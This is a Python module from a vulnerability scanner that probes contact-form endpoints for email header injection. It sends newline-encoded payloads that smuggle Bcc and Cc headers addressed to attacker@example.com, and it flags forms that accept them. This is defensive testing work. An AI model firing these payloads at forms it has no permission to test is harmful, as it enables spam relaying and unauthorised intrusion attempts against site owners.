#!/usr/bin/env python3
"""
Email Header Injection Tester
------------------------------
Tests contact forms and email features for BCC/CC injection.
"""

import requests
from typing import List, Dict, Optional
from rich.console import Console

console = Console()

PAYLOADS = [
    "attacker@example.com%0aBcc:attacker@example.com",
    "attacker@example.com\r\nBcc:attacker@example.com",
    "attacker@example.com%0d%0aBcc:attacker@example.com",
    "attacker@example.com\nCc:attacker@example.com",
]


class EmailHeaderInjectionTester:
    def __init__(self, target: str, session=None, timeout: int = 10):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.session = session or requests.Session()
        self.session.verify = False
        self.results: List[Dict] = []

    def _test_endpoint(self, url: str) -> Optional[Dict]:
        # This is a passive check simulating injection to known contact paths
        paths = ["/contact", "/api/contact", "/support", "/feedback"]
        for path in paths:
            full_url = self.target + path
            for payload in PAYLOADS:
                try:
                    data = {"email": payload, "subject": payload, "message": "test"}
                    resp = self.session.post(
                        full_url, data=data, timeout=self.timeout, verify=False
                    )
                    if resp and resp.status_code == 200:
                        # Hard to confirm without an out-of-band email receiver.
                        # For this tool, we flag the potential if the server doesn't reject it.
                        if (
                            "invalid" not in resp.text.lower()
                            and "error" not in resp.text.lower()
                        ):
                            return {
                                "url": full_url,
                                "type": "Email Header Injection (Potential)",
                                "severity": "medium",
                                "cvss": 5.3,
                                "detail": f"Form accepted email with newline chars. May allow BCC injection.",
                                "evidence": f"Payload accepted: {payload}",
                                "owasp": "A03:2021 – Injection",
                                "remediation": "Validate email fields strictly. Strip newline characters from inputs used in mail headers.",
                            }
                except Exception:
                    pass
        return None

    def run(self) -> List[Dict]:
        console.print(
            f"\n  [bold yellow]▶ Email Header Injection Tester on {self.target}[/bold yellow]"
        )
        res = self._test_endpoint(self.target)
        if res:
            self.results.append(res)
            console.print(f"  [bold red][!] {res['type']}[/bold red]")
        else:
            console.print("  [green]No Email Header Injection found[/green]")
        return self.results
